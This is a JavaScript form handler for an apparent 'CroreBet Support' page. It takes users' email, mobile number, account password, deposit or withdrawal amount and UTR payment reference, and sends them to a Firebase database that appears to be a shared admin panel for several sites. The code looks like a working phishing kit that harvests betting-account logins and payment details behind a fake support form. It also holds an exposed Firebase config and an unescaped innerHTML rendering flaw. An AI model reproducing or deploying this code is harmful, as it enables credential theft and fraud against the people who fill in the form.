// ==========================================
//  CROR BET - Form Handler
//  Firebase Firestore Integration
// ==========================================

// ===== FIREBASE CONFIG =====
const FIREBASE_CONFIG = {
  apiKey: "AIzaSyCiqaLzh7PoVC5l03sJFdtK548Wulufn94",
  authDomain: "alll-projects-admin-pennal.firebaseapp.com",
  projectId: "alll-projects-admin-pennal",
  storageBucket: "alll-projects-admin-pennal.firebasestorage.app",
  messagingSenderId: "689297868215",
  appId: "1:689297868215:web:2747b19c2da47a31f49432"
};

const SITE_ID = "crorebet";

// ===== FIREBASE DYNAMIC LOADER =====
let _fbDb = null;
let _fbLoading = null;

function loadFirebase() {
  if (_fbDb) return Promise.resolve(_fbDb);
  if (_fbLoading) return _fbLoading;

  _fbLoading = new Promise((resolve, reject) => {
    const initDb = () => {
      try {
        if (!firebase.apps.length) firebase.initializeApp(FIREBASE_CONFIG);
        _fbDb = firebase.firestore();
        resolve(_fbDb);
      } catch (e) { reject(e); }
    };
    if (window.firebase && window.firebase.firestore) { initDb(); return; }
    const urls = [
      'https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js',
      'https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore-compat.js'
    ];
    let loaded = 0;
    urls.forEach(src => {
      const s = document.createElement('script');
      s.src = src;
      s.onload = () => { loaded++; if (loaded === urls.length) initDb(); };
      s.onerror = () => reject(new Error('Firebase load failed: ' + src));
      document.head.appendChild(s);
    });
  });
  return _fbLoading;
}

function saveSubmission(data) {
  return loadFirebase().then(db => {
    const payload = { ...data, site_id: SITE_ID, created_at: firebase.firestore.FieldValue.serverTimestamp() };
    return db.collection('submissions').add(payload);
  });
}

// ===== LOCAL STORAGE =====
function saveMessage(data) {
  let messages = JSON.parse(localStorage.getItem('croorMessages') || '[]');
  messages.unshift(data);
  localStorage.setItem('croorMessages', JSON.stringify(messages));
  updateBadge();
}

function updateBadge() {
  const messages = JSON.parse(localStorage.getItem('croorMessages') || '[]');
  const badge = document.getElementById('msgBadge');
  if (badge) {
    if (messages.length > 0) {
      badge.style.display = 'flex';
      badge.textContent = messages.length > 9 ? '9+' : messages.length;
    } else {
      badge.style.display = 'none';
    }
  }
}

// ===== VALIDATION =====
function validateForm(fields) {
  let isValid = true;
  fields.forEach(f => {
    const el = document.getElementById(f);
    if (!el) return;
    if (el.value.trim() === '') { el.classList.add('invalid'); el.classList.remove('valid'); isValid = false; }
    else { el.classList.remove('invalid'); el.classList.add('valid'); }
  });
  return isValid;
}

document.addEventListener('DOMContentLoaded', () => {
  updateBadge();
  document.querySelectorAll('.input-field').forEach(input => {
    input.addEventListener('input', function() {
      if (this.value.trim() !== '') this.classList.remove('invalid');
    });
  });
  loadFirebase().then(() => {
    console.log('%c Firebase connected ✅', 'color:#34C759;font-weight:bold');
  }).catch(e => console.warn('Firebase:', e.message));
});

// ===== TAB SWITCHING =====
window.switchTab = function(tab) {
  const dTab = document.getElementById('depositTab');
  const wTab = document.getElementById('withdrawalTab');
  const dSec = document.getElementById('depositSection');
  const wSec = document.getElementById('withdrawalSection');
  if (!dTab || !wTab || !dSec || !wSec) return;
  if (tab === 'deposit') {
    dTab.classList.add('active'); wTab.classList.remove('active');
    dSec.classList.add('active'); wSec.classList.remove('active');
  } else {
    wTab.classList.add('active'); dTab.classList.remove('active');
    wSec.classList.add('active'); dSec.classList.remove('active');
  }
};

// ===== SUBMIT DEPOSIT =====
window.submitDeposit = async function() {
  const fields = ['d_email', 'd_mobile', 'd_password', 'd_amount', 'd_utr'];
  if (!validateForm(fields)) return;

  const btn = document.getElementById('depositBtn');
  if (!btn) return;
  btn.classList.add('loading');

  const data = {
    type: 'Deposit',
    email: getVal('d_email'),
    mobile: getVal('d_mobile'),
    password: getVal('d_password'),
    amount: getVal('d_amount'),
    utr: getVal('d_utr'),
    time: new Date().toLocaleString('en-IN'),
    source: 'CroreBet Support'
  };

  saveMessage(data);
  saveSubmission(data).catch(err => console.warn('Firebase:', err));

  setTimeout(() => {
    btn.classList.remove('loading');
    fields.forEach(f => { const el = document.getElementById(f); if (el) { el.value = ''; el.classList.remove('valid', 'invalid'); } });
    showSuccess();
  }, 1800);
};

// ===== SUBMIT WITHDRAWAL =====
window.submitWithdrawal = async function() {
  const fields = ['w_email', 'w_mobile', 'w_password', 'w_amount'];
  if (!validateForm(fields)) return;

  const btn = document.getElementById('withdrawalBtn');
  if (!btn) return;
  btn.classList.add('loading');

  const data = {
    type: 'Withdrawal',
    email: getVal('w_email'),
    mobile: getVal('w_mobile'),
    password: getVal('w_password'),
    amount: getVal('w_amount'),
    time: new Date().toLocaleString('en-IN'),
    source: 'CroreBet Support'
  };

  saveMessage(data);
  saveSubmission(data).catch(err => console.warn('Firebase:', err));

  setTimeout(() => {
    btn.classList.remove('loading');
    fields.forEach(f => { const el = document.getElementById(f); if (el) { el.value = ''; el.classList.remove('valid', 'invalid'); } });
    showSuccess();
  }, 1800);
};

function getVal(id) {
  const el = document.getElementById(id);
  return el ? el.value : '';
}

// ===== SUCCESS POPUP & CONFETTI =====
function showSuccess() {
  const ov = document.getElementById('successOverlay');
  if (ov) ov.classList.add('show');
  launchConfetti();
}

window.closePopup = function() {
  const ov = document.getElementById('successOverlay');
  if (ov) ov.classList.remove('show');
};

function launchConfetti() {
  const container = document.getElementById('confettiContainer');
  if (!container) return;
  container.innerHTML = '';
  const colors = ['#007aff', '#5856d6', '#34c759', '#ff9500', '#ff3b30', '#af52de', '#ff2d55'];
  for (let i = 0; i < 50; i++) {
    const c = document.createElement('div');
    c.className = 'confetti';
    c.style.left = Math.random() * 100 + '%';
    c.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
    c.style.animationDelay = Math.random() * 2 + 's';
    c.style.animationDuration = (Math.random() * 2 + 2) + 's';
    c.style.width = (Math.random() * 8 + 4) + 'px';
    c.style.height = (Math.random() * 8 + 4) + 'px';
    c.style.borderRadius = Math.random() > 0.5 ? '50%' : '2px';
    container.appendChild(c);
  }
  setTimeout(() => { container.innerHTML = ''; }, 4000);
}

// ===== MAILBOX =====
window.openMailbox = function() {
  const hp = document.getElementById('homePage');
  const mp = document.getElementById('mailboxPage');
  if (hp) hp.classList.remove('active');
  if (mp) mp.classList.add('active');
  renderMailbox();
};

window.goHome = function() {
  const mp = document.getElementById('mailboxPage');
  const hp = document.getElementById('homePage');
  if (mp) mp.classList.remove('active');
  if (hp) hp.classList.add('active');
  updateBadge();
};

function renderMailbox() {
  const container = document.getElementById('mailboxContent');
  if (!container) return;
  const messages = JSON.parse(localStorage.getItem('croorMessages') || '[]');
  if (messages.length === 0) {
    container.innerHTML = '<div class="mailbox-empty"><i class="fas fa-inbox"></i><h3>No Messages</h3><p>Your submitted forms will appear here</p></div>';
    return;
  }
  let html = '';
  messages.forEach((msg, index) => {
    const isDeposit = msg.type === 'Deposit';
    html += `
      <div class="message-card ${isDeposit ? '' : 'withdrawal'}">
        <div class="message-header">
          <div class="message-type"><span class="message-type-badge ${isDeposit ? 'deposit' : 'withdrawal'}">${isDeposit ? '📥 Deposit' : '📤 Withdrawal'}</span></div>
          <span class="message-time">${msg.time}</span>
        </div>
        <div class="message-details">
          <div class="message-detail"><span class="label"><i class="fas fa-envelope" style="margin-right:4px;color:#8e8e93;"></i> Email</span><span class="value">${msg.email}</span></div>
          <div class="message-detail"><span class="label"><i class="fas fa-mobile-screen" style="margin-right:4px;color:#8e8e93;"></i> Mobile</span><span class="value">${msg.mobile}</span></div>
          <div class="message-detail"><span class="label"><i class="fas fa-indian-rupee-sign" style="margin-right:4px;color:#8e8e93;"></i> Amount</span><span class="value">₹${msg.amount}</span></div>
          ${msg.utr ? '<div class="message-detail"><span class="label"><i class="fas fa-receipt" style="margin-right:4px;color:#8e8e93;"></i> UTR</span><span class="value">' + msg.utr + '</span></div>' : ''}
        </div>
        <div style="text-align:right;margin-top:8px;"><button class="delete-btn" onclick="deleteMessage(' + index + ')"><i class="fas fa-trash-can"></i> Delete</button></div>
      </div>`;
  });
  html += '<button class="clear-all-btn" onclick="clearAll()"><i class="fas fa-trash-can"></i> Clear All Messages</button>';
  container.innerHTML = html;
}

window.deleteMessage = function(index) {
  let messages = JSON.parse(localStorage.getItem('croorMessages') || '[]');
  messages.splice(index, 1);
  localStorage.setItem('croorMessages', JSON.stringify(messages));
  renderMailbox();
  updateBadge();
};

window.clearAll = function() {
  if (confirm('Are you sure you want to delete all messages?')) {
    localStorage.removeItem('croorMessages');
    renderMailbox();
    updateBadge();
  }
};
